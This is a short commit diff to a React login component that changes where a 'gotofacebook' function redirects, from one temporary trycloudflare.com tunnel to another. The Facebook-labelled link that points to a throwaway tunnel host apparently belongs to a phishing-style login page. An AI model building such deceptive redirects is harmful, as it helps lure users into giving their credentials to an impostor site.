0aa4fed0a020a79e4cc8b9d87ed848afb8b512c1
AlbanMurtezaj <94935345+aalbaan@users.noreply.github.com>
2024-04-23 22:52:41 +0200

    Update Login.jsx

--- src/components/LoginForm/Login.jsx
+++ src/components/LoginForm/Login.jsx
@@ -16,7 +16,7 @@ const Login = () => {
   }
 
   const gotofacebook = () => {
-    window.location.href = 'https://lift-fuzzy-fixes-whereas.trycloudflare.com';
+    window.location.href = 'https://week-lat-together-brown.trycloudflare.com';
   }
 
   const handleLogin = async (e) => {
